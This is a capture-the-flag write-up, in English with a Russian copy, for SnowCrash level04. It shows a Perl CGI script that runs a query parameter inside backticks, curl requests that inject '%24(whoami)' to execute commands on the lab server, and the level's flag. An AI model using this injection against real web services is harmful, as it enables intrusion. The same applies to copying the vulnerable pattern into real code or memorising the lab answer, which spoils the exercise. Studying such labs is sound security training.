# Level04

## Flag

ne2searoevaevoem4ov4ar8ap

## Discovery

We have a file level04.pl

it includes sending a request to the level04 server

```bash
cat level04.pl
```

```bash
#!/usr/bin/perl
# localhost:4747     //The hint is that the script is running on port 4747.
use CGI qw{param};   //Connects the CGI library and the param function, which receives parameters from an HTTP request (for example, ?x=value).
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

#first test
level04@SnowCrash:~$ ./level04.pl 
Content-type: text/html

```bash
netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN     
tcp6       0      0 :::4646                 :::*                    LISTEN     
tcp6       0      0 :::4747                 :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::4242                 :::*                    LISTEN     
udp        0      0 0.0.0.0:68              0.0.0.0:*
```
This means that some kind of web server (for example, Apache or an embedded HTTP daemon) accepts connections on port 4747.
```bash
telnet 127.0.0.1 4747
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
^C
Connection closed by foreign host.
```
we have connection with that
check what is it

```bash
nginx
```
```bash
apache2
```
we recieved information abot apache2

check directories with apache2 conf

find sites-enabled

trying to request something via curl
```bash
level04@SnowCrash:/tmp/level04$ curl 'http://localhost:4747/?x=whoami'
whoami
```
* The web server receives it and runs the script. level04.pl like a CGI program.
* The server passes the parameters to the script
* The parameter x=whoami is passed to the CGI environment.
* Inside the Perl script, the param("x") function extracts this value.
* The script is executed and returns a response
* The script prints the HTTP header Content-type: text/html.
* Then executes the echo whoami command.
* The result is returned to the web server.
* The web server sends it to the client (curl or browser).

outputs whoami because in this format the request initializes the echo command.

```bash
level04@SnowCrash:/tmp/level04$ curl 'http://localhost:4747/?x=$(whoami)'
level04
```
Here, the shell of your local terminal first sees the $(whoami) construct.
She executes the whoami command on your machine, and inserts the result directly into the query string.
Since you are logged in as level04, the command returns level04.

In the case of $(...), the shell tries to execute the command locally, and in the case of %24(...) the $ character is passed as text in the URL to be processed by the server.
```bash
level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=%24(whoami)"
flag04
```
we get the executed command


checking what we have
The vulnerability occurs in a CGI script level04.pl because it:
Takes the parameter x from the query (param("x")).
This allows you to execute arbitrary commands on the server via injection.

------------------------------------------------------------------------------------------------
у нас есть файл level04.pl

включает он в себя отправку запроса на сервер
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

level04@SnowCrash:~$ ./level04.pl 
Content-type: text/html

level04@SnowCrash:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN     
tcp6       0      0 :::4646                 :::*                    LISTEN     
tcp6       0      0 :::4747                 :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::4242                 :::*                    LISTEN     
udp        0      0 0.0.0.0:68              0.0.0.0:*

level04@SnowCrash:~$ telnet 127.0.0.1 4747
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
^C
Connection closed by foreign host.


пробуем что нибудь запросить через curl
level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=whoami"
whoami

выводит whoami потому что в таком формате запрос инициализирует команду echo

level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=$(whoami)"
level04

В случае $(...), оболочка пытается выполнить команду локально, а в случае %24(...) символ $ передается как текст в URL, который будет обработан сервером.

level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=%24(whoami)"
flag04

получаем выполненную команду


проверяем что у нас есть

